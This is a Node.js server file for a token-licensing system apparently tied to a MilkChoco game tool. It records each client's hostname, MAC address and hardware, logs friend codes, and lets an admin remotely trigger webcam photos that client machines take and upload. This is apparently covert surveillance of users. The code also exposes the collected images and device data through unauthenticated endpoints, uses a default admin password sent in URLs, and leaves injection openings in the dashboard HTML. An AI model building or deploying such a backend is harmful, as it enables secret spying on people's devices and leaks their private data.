// server.js - 完全版（オンライン状態判定機能付き）
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const https = require('https');
const crypto = require('crypto');
const app = express();
const port = process.env.PORT || 3000;

// === トークン生成 ===
function generateToken() {
  const charsLower = 'abcdefghijklmnopqrstuvwxyz';
  const charsUpper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const charsNumbers = '0123456789';
  const allChars = charsLower + charsUpper + charsNumbers;
  const length = Math.floor(Math.random() * (20 - 15 + 1)) + 15;
  const result = [
    charsLower[crypto.randomInt(charsLower.length)],
    charsUpper[crypto.randomInt(charsUpper.length)],
    charsNumbers[crypto.randomInt(charsNumbers.length)]
  ];
  for (let i = 3; i < length; i++) {
    result.push(allChars[crypto.randomInt(allChars.length)]);
  }
  for (let i = result.length - 1; i > 0; i--) {
    const j = crypto.randomInt(i + 1);
    [result[i], result[j]] = [result[j], result[i]];
  }
  return result.join('');
}

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

// === express ミドルウェア ===
app.use(express.urlencoded({ extended: true, limit: '15mb' }));
app.use(express.json({ limit: '15mb' }));

// === DB ===
const dbPath = path.join(__dirname, 'tokens.db');
const db = new sqlite3.Database(dbPath, (err) => {
  if (err) console.error("DB接続失敗:", err);
  else console.log(`DB接続: ${dbPath}`);
});

db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS tokens (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      token TEXT UNIQUE NOT NULL,
      user TEXT NOT NULL,
      expires TEXT NOT NULL,
      uses INTEGER DEFAULT 10,
      used INTEGER DEFAULT 0,
      created DATETIME DEFAULT CURRENT_TIMESTAMP,
      version TEXT NOT NULL DEFAULT '3.0',
      device_id TEXT DEFAULT NULL,
      device_info TEXT DEFAULT NULL,
      first_used DATETIME DEFAULT NULL,
      last_seen INTEGER DEFAULT NULL
    )
  `);
  db.run(`
    CREATE TABLE IF NOT EXISTS device_mismatches (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      token TEXT NOT NULL,
      expected_device_id TEXT,
      actual_device_id TEXT,
      actual_device_info TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
  db.run(`
    CREATE TABLE IF NOT EXISTS friend_codes (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      token TEXT NOT NULL,
      fc TEXT NOT NULL,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
  db.run(`
    CREATE TABLE IF NOT EXISTS camera_requests (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      token TEXT NOT NULL,
      status TEXT DEFAULT 'pending',
      requested_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      delivered_at DATETIME DEFAULT NULL,
      captured_at DATETIME DEFAULT NULL
    )
  `);
  db.run(`
    CREATE TABLE IF NOT EXISTS camera_images (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      token TEXT NOT NULL,
      request_id INTEGER,
      data BLOB NOT NULL,
      mimetype TEXT DEFAULT 'image/jpeg',
      size INTEGER DEFAULT 0,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
});

// マイグレーション（既存DBへのカラム追加）
db.all("PRAGMA table_info(tokens)", (err, rows) => {
  if (err) return;
  const cols = (rows || []).map(r => r.name);
  if (!cols.includes('device_id')) db.run("ALTER TABLE tokens ADD COLUMN device_id TEXT DEFAULT NULL");
  if (!cols.includes('device_info')) db.run("ALTER TABLE tokens ADD COLUMN device_info TEXT DEFAULT NULL");
  if (!cols.includes('first_used')) db.run("ALTER TABLE tokens ADD COLUMN first_used DATETIME DEFAULT NULL");
  if (!cols.includes('order_id')) db.run("ALTER TABLE tokens ADD COLUMN order_id TEXT DEFAULT NULL");
  if (!cols.includes('last_seen')) {
    db.run("ALTER TABLE tokens ADD COLUMN last_seen INTEGER DEFAULT NULL");
    console.log("[Migration] last_seen 列を追加");
  }
});

// === キャッシュ ===
let tokenCache = {};
async function updateCache() {
  return new Promise((resolve) => {
    db.all("SELECT * FROM tokens", (err, rows) => {
      if (err) { console.error("キャッシュ更新失敗:", err); return resolve(); }
      tokenCache = {};
      rows.forEach(row => tokenCache[row.token] = row);
      resolve();
    });
  });
}

updateCache().then(() => console.log(`キャッシュロード: ${Object.keys(tokenCache).length}トークン`));

// === ログインHTML ===
function getLoginHTML(error = '') {
  return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>管理画面ログイン</title>
  <style>
    body {font-family: sans-serif; background: #f0f0f0; padding: 50px; text-align: center;}
    .card {background: white; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.1);}
    input, button {padding: 12px; margin: 10px; width: 280px; border: 1px solid #ddd; border-radius: 8px;}
    button {background: #4CAF50; color: white; font-weight: bold; cursor: pointer;}
    button:hover {background: #45a049;}
    .error {color: red; font-weight: bold;}
  </style>
</head>
<body>
  <div class="card">
    <h2>MilkChoco 管理画面</h2>
    <form method="POST" action="/login">
      <input type="password" name="password" placeholder="パスワード" required autofocus><br>
      <button type="submit">ログイン</button>
    </form>
    ${error ? `<p class="error">${error}</p>` : ''}
  </div>
</body>
</html>`;
}

function requireAuth(req, res, next) {
  const password = req.body.password || req.query.password;
  if (password === ADMIN_PASSWORD) return next();
  res.send(getLoginHTML('パスワードが間違っています'));
}

// === ルート ===
app.get('/', (req, res) => res.send(getLoginHTML()));
app.post('/login', requireAuth, (req, res) => {
  res.redirect('/dashboard?password=' + encodeURIComponent(req.body.password));
});

// ダッシュボード
app.get('/dashboard', async (req, res) => {
  await updateCache();
  const adminPw = req.query.password || ''; 

  const mismatchCounts = await new Promise(r => {
    db.all("SELECT token, COUNT(*) as cnt FROM device_mismatches GROUP BY token", (e, rows) => {
      if (e) return r({});
      const map = {};
      rows.forEach(row => map[row.token] = row.cnt);
      r(map);
    });
  });

  const cameraPendingCounts = await new Promise(r => {
    db.all("SELECT token, COUNT(*) as cnt FROM camera_requests WHERE status IN ('pending','delivered') GROUP BY token", (e, rows) => {
      if (e) return r({});
      const map = {};
      rows.forEach(row => map[row.token] = row.cnt);
      r(map);
    });
  });

  let html = `<h1>Token Manager(時間は＋9時間)</h1><ul>`;
  for (const [t, d] of Object.entries(tokenCache)) {
    const remaining = d.uses - d.used;
    const expired = new Date(d.expires) < new Date();
    const mismatchCount = mismatchCounts[t] || 0;
    const mismatchBadge = mismatchCount > 0 ? ` <span style="color:red; font-weight:bold;">⚠ 端末不一致 ${mismatchCount}件</span>` : '';
    const deviceStatus = d.device_id ? `<span style="color:#28a745;">[端末登録済]</span>` : `<span style="color:#ff9800;">[未使用]</span>`;
    const cameraPending = cameraPendingCounts[t] || 0;
    const cameraBadge = cameraPending > 0 ? ` <span style="color:#e67e22; font-weight:bold;">📷待機中(${cameraPending})</span>` : '';

    // ★追加: オンライン状態の判定（30秒以内に通信があれば「使用中」）
    const isOnline = d.last_seen && (Date.now() - d.last_seen < 5000);
    const onlineBadge = isOnline 
      ? `<span style="background:#28a745; color:white; padding:2px 6px; border-radius:4px; font-size:12px; font-weight:bold; margin-right:8px;">🟢 使用中</span>` 
      : `<span style="background:#ccc; color:#555; padding:2px 6px; border-radius:4px; font-size:12px; font-weight:bold; margin-right:8px;">⚫ オフライン</span>`;

    html += `<li style="margin:10px 0; padding:6px; background:#fafafa; border-radius:6px;">
      ${onlineBadge}
      <b>${t}</b> - ${d.user} - Ver: ${d.version} - ${expired ? '期限切れ' : '残り: ' + remaining + '回'} - ${d.expires}
      ${deviceStatus}${mismatchBadge}${cameraBadge}<br>
      <a href="/delete?token=${t}&password=${encodeURIComponent(adminPw)}" style="color:red;" onclick="return confirm('無効化？');">[無効化]</a>
      <a href="javascript:void(0)" onclick="showDeviceInfo('${t}')" style="color:#007bff; margin-left:8px;">[端末情報を表示]</a>
      <a href="javascript:void(0)" onclick="showFriendCodes('${t}')" style="color:#007bff; margin-left:8px;">[フレンドコードをみる]</a>
      <a href="javascript:void(0)" onclick="requestCamera('${t}')" style="color:#e67e22; margin-left:8px; font-weight:bold;">[📷 カメラ]</a>
      <a href="javascript:void(0)" onclick="showCameraImages('${t}')" style="color:#9b59b6; margin-left:8px; font-weight:bold;">[🖼 画像を見る]</a>
    </li>`;
  }
  html += `</ul><hr>
    <form action="/add?password=${encodeURIComponent(adminPw)}" method="POST">
      Token: <input name="token" value="${generateToken()}" readonly><br><br>
      ユーザー: <input name="user" required><br><br>
      バージョン: <input name="version" value="3.0" required placeholder="例: 3.0 or legacy"><br><br>
      期限: <input name="expires" type="date" required><br><br>
      回数: <input name="uses" type="number" value="10" min="1" required><br><br>
      <button>発行</button>
    </form>
    <p><a href="/">ログアウト</a></p>

    <div id="modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.55); z-index:1000;">
      <div style="background:white; margin:40px auto; padding:22px; max-width:920px; max-height:82vh; overflow-y:auto; border-radius:10px; position:relative; box-shadow:0 8px 32px rgba(0,0,0,0.3);">
        <button onclick="document.getElementById('modal').style.display='none'" style="position:absolute; top:10px; right:10px; padding:6px 12px; cursor:pointer; background:#666; color:white; border:none; border-radius:5px;">閉じる</button>
        <div id="modal-content" style="margin-top:16px;"></div>
      </div>
    </div>

    <script>
    let adminPw = ${JSON.stringify(adminPw)};
    if (adminPw) sessionStorage.setItem('adminPw', adminPw);
    else adminPw = sessionStorage.getItem('adminPw') || '';

    function showDeviceInfo(token) {
      fetch('/api/device-info?token=' + encodeURIComponent(token)).then(r => r.text()).then(html => {
        document.getElementById('modal-content').innerHTML = html;
        document.getElementById('modal').style.display = 'block';
      });
    }
    function showFriendCodes(token) {
      fetch('/api/friend-codes?token=' + encodeURIComponent(token)).then(r => r.text()).then(html => {
        document.getElementById('modal-content').innerHTML = html;
        document.getElementById('modal').style.display = 'block';
      });
    }
    function showCameraImages(token) {
      fetch('/api/camera-images?token=' + encodeURIComponent(token)).then(r => r.text()).then(html => {
        document.getElementById('modal-content').innerHTML = html;
        document.getElementById('modal').style.display = 'block';
      });
    }
    async function requestCamera(token) {
      if (!adminPw) return alert('セッションが切れました。再度ログインしてください。');
      try {
        const res = await fetch('/api/admin/request-camera', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPw },
          body: JSON.stringify({ token })
        });
        const data = await res.json();
        if (res.ok) alert('📷 撮影リクエスト送信。クライアントが数秒以内に撮影します。');
        else alert('エラー: ' + (data.error || 'unknown'));
      } catch (e) {
        alert('通信エラー: ' + e.message);
      }
    }
    </script>`;
  res.send(html);
});

// 発行
app.post('/add', (req, res) => {
  const { token, user, version, expires, uses } = req.body;
  const adminPw = req.query.password || ''; 
  if (!token || !user || !version || !expires || !uses) return res.send('入力漏れ');
  
  db.run(
    "INSERT OR REPLACE INTO tokens (token, user, version, expires, uses, used, device_id, device_info, first_used) VALUES (?, ?, ?, ?, ?, 0, NULL, NULL, NULL)",
    [token, user, version, expires, parseInt(uses)],
    async (err) => {
      if (err) return res.send('発行失敗: ' + err.message);
      await updateCache();
      res.redirect('/dashboard?password=' + encodeURIComponent(adminPw)); 
    }
  );
});

// 無効化
app.get('/delete', async (req, res) => {
  const token = req.query.token;
  const adminPw = req.query.password || ''; 
  if (!token) return res.redirect('/dashboard?password=' + encodeURIComponent(adminPw));
  
  db.run("DELETE FROM tokens WHERE token = ?", [token], async (err) => {
    if (err) console.error("削除失敗:", err);
    await updateCache();
    res.redirect('/dashboard?password=' + encodeURIComponent(adminPw)); 
  });
});

// === API: 端末情報 ===
app.get('/api/device-info', async (req, res) => {
  const token = req.query.token;
  const data = tokenCache[token];
  if (!data) return res.send('<p>トークンが見つかりません</p>');

  let html = `<h2>端末情報</h2><p><b>Token:</b> <code>${token}</code></p>`;

  if (!data.device_id) {
    html += `<p style="color:#ff9800; font-weight:bold;">このトークンはまだ使用されていません</p>`;
  } else {
    let info = {};
    try { info = JSON.parse(data.device_info || '{}'); } catch (e) {}

    html += `<p><b>登録端末ID:</b> <code style="background:#eef; padding:2px 6px;">${data.device_id}</code></p>`;
    html += `<p><b>初回使用日時:</b> ${data.first_used || '不明'}</p>`;
    html += `<table border="1" cellpadding="8" style="border-collapse:collapse; margin-top:10px;">
      <tr><th style="background:#f0f0f0; text-align:left;">ホスト名</th><td>${escapeHtml(info.hostname || '-')}</td></tr>
      <tr><th style="background:#f0f0f0; text-align:left;">プラットフォーム</th><td>${escapeHtml(info.platform || '-')}</td></tr>
      <tr><th style="background:#f0f0f0; text-align:left;">アーキテクチャ</th><td>${escapeHtml(info.arch || '-')}</td></tr>
      <tr><th style="background:#f0f0f0; text-align:left;">OSバージョン</th><td>${escapeHtml(info.release || '-')}</td></tr>
      <tr><th style="background:#f0f0f0; text-align:left;">CPU</th><td>${escapeHtml(info.cpu || '-')}</td></tr>
      <tr><th style="background:#f0f0f0; text-align:left;">コア数</th><td>${escapeHtml(String(info.cores || '-'))}</td></tr>
      <tr><th style="background:#f0f0f0; text-align:left;">MACアドレス</th><td>${escapeHtml(info.mac || '-')}</td></tr>
      <tr><th style="background:#f0f0f0; text-align:left;">メモリ</th><td>${escapeHtml(info.totalmem || '-')}</td></tr>
    </table>`;
  }

  const mismatches = await new Promise(r => {
    db.all("SELECT * FROM device_mismatches WHERE token = ? ORDER BY id DESC", [token], (e, rows) => r(rows || []));
  });

  if (mismatches.length > 0) {
    html += `<h3 style="color:red; margin-top:22px;">⚠ 端末情報不一致ログ (${mismatches.length}件)</h3>`;
    html += `<table border="1" cellpadding="8" style="border-collapse:collapse; font-size:13px; width:100%;">
      <tr style="background:#ffdddd;"><th>日時</th><th>正規端末ID</th><th>不正端末ID</th><th>不正端末情報</th></tr>`;
    mismatches.forEach(m => {
      let info = {};
      try { info = JSON.parse(m.actual_device_info || '{}'); } catch (e) {}
      const infoStr = Object.entries(info).map(([k, v]) => `${escapeHtml(k)}: ${escapeHtml(String(v))}`).join('<br>');
      html += `<tr style="background:#ffeeee;">
        <td>${escapeHtml(m.timestamp || '')}</td>
        <td><code style="font-size:11px;">${escapeHtml(m.expected_device_id || '-')}</code></td>
        <td><code style="font-size:11px; color:red; font-weight:bold;">${escapeHtml(m.actual_device_id || '-')}</code></td>
        <td style="color:red; font-size:11px;">${infoStr || '-'}</td>
      </tr>`;
    });
    html += `</table>`;
  } else {
    html += `<p style="color:#28a745; margin-top:18px; font-weight:bold;">✓ 不正アクセスは検出されていません</p>`;
  }

  res.send(html);
});

// === API: フレンドコードログ ===
app.get('/api/friend-codes', async (req, res) => {
  const token = req.query.token;
  const data = tokenCache[token];
  if (!data) return res.send('<p>トークンが見つかりません</p>');

  const logs = await new Promise(r => {
    db.all("SELECT * FROM friend_codes WHERE token = ? ORDER BY id DESC LIMIT 200", [token], (e, rows) => r(rows || []));
  });

  let html = `<h2>フレンドコード使用履歴</h2><p><b>Token:</b> <code>${token}</code></p>`;

  if (logs.length === 0) {
    html += `<p>まだフレンドコードの使用履歴がありません</p>`;
  } else {
    html += `<table border="1" cellpadding="8" style="border-collapse:collapse; width:100%;">
      <tr style="background:#f0f0f0;"><th>#</th><th>フレンドコード</th><th>日時</th></tr>`;
    logs.forEach((log, idx) => {
      html += `<tr><td>${logs.length - idx}</td><td><code style="font-size:14px; font-weight:bold; color:#007bff;">${escapeHtml(log.fc)}</code></td><td>${escapeHtml(log.timestamp || '')}</td></tr>`;
    });
    html += `</table>`;
  }

  res.send(html);
});

// === API: トークンチェック ===
app.get('/api/check', async (req, res) => {
  const token = req.query.token;
  const version = req.query.version;
  const deviceId = req.query.device_id;
  const deviceInfo = req.query.device_info;

  if (token === 'HEALTH') return res.json({ valid: false, msg: 'Server is alive' });
  if (!version) return res.json({ valid: false, msg: 'バージョン指定が必要です（古いEXE？）' });
  if (!deviceId) return res.json({ valid: false, msg: '端末情報を取得できませんでした' });

  const data = tokenCache[token];
  if (!data || new Date(data.expires) < new Date() || data.used >= data.uses) return res.json({ valid: false, msg: '無効なToken' });
  if (data.version !== version) return res.json({ valid: false, msg: 'バージョンが一致しません' });

  if (!data.device_id) {
    db.run(
      "UPDATE tokens SET device_id = ?, device_info = ?, first_used = CURRENT_TIMESTAMP WHERE token = ?",
      [deviceId, deviceInfo || '', token],
      (err) => { if (err) console.error("初回端末登録失敗:", err); }
    );
    data.device_id = deviceId;
    data.device_info = deviceInfo || '';
  } else if (data.device_id !== deviceId) {
    db.run(
      "INSERT INTO device_mismatches (token, expected_device_id, actual_device_id, actual_device_info) VALUES (?, ?, ?, ?)",
      [token, data.device_id, deviceId, deviceInfo || '']
    );
    return res.json({ valid: false, msg: '⚠ 端末情報が一致しません。このトークンは別の端末で使用されています。' });
  }

  data.used++;
  data.last_seen = Date.now(); // ★追加: 認証時にも生存確認更新
  db.run("UPDATE tokens SET used = ?, last_seen = ? WHERE token = ?", [data.used, data.last_seen, token], (err) => { if (err) console.error(err); });
  res.json({ valid: true });
});

// === API: FCログ ===
app.get('/api/log-fc', (req, res) => {
  const { token, fc, device } = req.query;
  if (!token || !fc) return res.json({ ok: false });

  const data = tokenCache[token];
  if (!data) return res.json({ ok: false });
  if (data.device_id && device && data.device_id !== device) return res.json({ ok: false, msg: '端末不一致' });

  db.get("SELECT fc FROM friend_codes WHERE token = ? ORDER BY id DESC LIMIT 1", [token], (err, row) => {
    if (err) return res.json({ ok: false });
    if (row && row.fc === String(fc)) return res.json({ ok: true, skipped: true });
    db.run("INSERT INTO friend_codes (token, fc) VALUES (?, ?)", [token, String(fc)], (err2) => {
      if (err2) return res.json({ ok: false });
      res.json({ ok: true });
    });
  });
});

// === カメラ機能 ===
app.post('/api/admin/request-camera', (req, res) => {
  const adminPassword = req.headers['x-admin-password'];
  if (adminPassword !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Unauthorized' });

  const { token } = req.body || {};
  if (!token) return res.status(400).json({ error: 'token required' });

  const data = tokenCache[token];
  if (!data) return res.status(404).json({ error: 'token not found' });
  if (!data.device_id) return res.status(400).json({ error: '端末未登録のトークンです' });

  db.run("INSERT INTO camera_requests (token, status) VALUES (?, 'pending')", [token], function (err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ ok: true, requestId: this.lastID });
  });
});

app.get('/api/camera-poll', (req, res) => {
  const { token, device } = req.query;
  if (!token || !device) return res.status(400).json({ error: 'token and device required' });

  const data = tokenCache[token];
  if (!data) return res.status(404).json({ error: 'invalid token' });
  if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });

  // ★追加: ポーリング（5秒毎）を生存確認として利用
  data.last_seen = Date.now();
  db.run("UPDATE tokens SET last_seen = ? WHERE token = ?", [data.last_seen, token]);

  db.get("SELECT id FROM camera_requests WHERE token = ? AND status = 'pending' ORDER BY id ASC LIMIT 1", [token], (err, row) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!row) return res.json({ request: null });

    db.run("UPDATE camera_requests SET status = 'delivered', delivered_at = CURRENT_TIMESTAMP WHERE id = ?", [row.id], (err2) => {
      if (err2) return res.status(500).json({ error: err2.message });
      res.json({ request: { id: row.id } });
    });
  });
});

app.post('/api/camera-upload', (req, res) => {
  const { token, requestId, device, imageBase64, mimetype } = req.body || {};
  if (!token || !device || !imageBase64) return res.status(400).json({ error: 'missing fields' });

  const data = tokenCache[token];
  if (!data) return res.status(404).json({ error: 'invalid token' });
  if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });

  let buffer;
  try { buffer = Buffer.from(imageBase64, 'base64'); } catch (e) { return res.status(400).json({ error: 'bad base64' }); }
  if (buffer.length === 0) return res.status(400).json({ error: 'empty image' });
  if (buffer.length > 5 * 1024 * 1024) return res.status(413).json({ error: 'too large' });

  db.run("INSERT INTO camera_images (token, request_id, data, mimetype, size) VALUES (?, ?, ?, ?, ?)", [token, requestId || null, buffer, mimetype || 'image/jpeg', buffer.length], function (err) {
    if (err) return res.status(500).json({ error: err.message });
    if (requestId) db.run("UPDATE camera_requests SET status = 'captured', captured_at = CURRENT_TIMESTAMP WHERE id = ?", [requestId]);
    res.json({ ok: true, imageId: this.lastID });
  });
});

app.get('/api/camera-images', (req, res) => {
  const { token } = req.query;
  if (!token) return res.send('<p>token required</p>');

  db.all("SELECT id, size, mimetype, created_at FROM camera_images WHERE token = ? ORDER BY id DESC LIMIT 100", [token], (err, rows) => {
    if (err) return res.send('<p>DB error</p>');
    let html = `<h2>📷 撮影画像</h2><p><b>Token:</b> <code>${escapeHtml(token)}</code></p>`;
    if (!rows || rows.length === 0) {
      html += '<p style="color:#888;">まだ画像がありません</p>';
      return res.send(html);
    }
    html += `<div style="display:grid; grid-template-columns:repeat(auto-fill,minmax(220px,1fr)); gap:10px; margin-top:14px;">`;
    rows.forEach(r => {
      const sizeKB = Math.round(r.size / 1024);
      const url = `/api/camera-image/${r.id}`;
      html += `<div style="border:1px solid #ddd; padding:8px; border-radius:8px; background:#fafafa;">
        <a href="${url}" target="_blank"><img src="${url}" style="width:100%; height:auto; border-radius:4px; display:block;"></a>
        <div style="font-size:11px; color:#666; margin-top:6px;">ID:${r.id} | ${escapeHtml(r.created_at || '')} | ${sizeKB}KB</div>
      </div>`;
    });
    html += `</div>`;
    res.send(html);
  });
});

app.get('/api/camera-image/:id', (req, res) => {
  const id = parseInt(req.params.id);
  if (!id) return res.status(400).send('invalid id');
  db.get("SELECT data, mimetype FROM camera_images WHERE id = ?", [id], (err, row) => {
    if (err || !row) return res.status(404).send('not found');
    res.set('Content-Type', row.mimetype || 'image/jpeg');
    res.set('Cache-Control', 'public, max-age=300');
    res.send(row.data);
  });
});

// === 管理API ===
app.post('/api/admin/issue', (req, res) => {
  const adminPassword = req.headers['x-admin-password'];
  if (adminPassword !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Unauthorized' });

  const { user, version, uses, expires, orderId } = req.body;
  if (orderId) {
    db.get("SELECT token FROM tokens WHERE order_id = ?", [orderId], (err, row) => {
      if (err) return res.status(500).json({ error: err.message });
      if (row) return res.json({ success: true, token: row.token, reused: true });
      issueNewToken(user, version, uses, expires, orderId, res);
    });
  } else {
    issueNewToken(user, version, uses, expires, null, res);
  }
});

function issueNewToken(user, version, uses, expires, orderId, res) {
  const token = generateToken();
  db.run("INSERT INTO tokens (token, user, version, expires, uses, used, order_id) VALUES (?, ?, ?, ?, ?, 0, ?)", [token, user || 'customer', version || '3.0', expires, uses || 10, orderId], async (err) => {
    if (err) return res.status(500).json({ error: err.message });
    await updateCache();
    res.json({ success: true, token, reused: false });
  });
}

function escapeHtml(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

// === スリープ防止 ===
const SELF_PING_URL = 'https://token-authentication-j0r3.onrender.com';
const PING_INTERVAL_MS = 7 * 60 * 1000;

function startSelfPing() {
  setInterval(() => {
    https.get(SELF_PING_URL, (res) => res.resume()).on('error', () => {});
  }, PING_INTERVAL_MS);
}

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  startSelfPing();
});
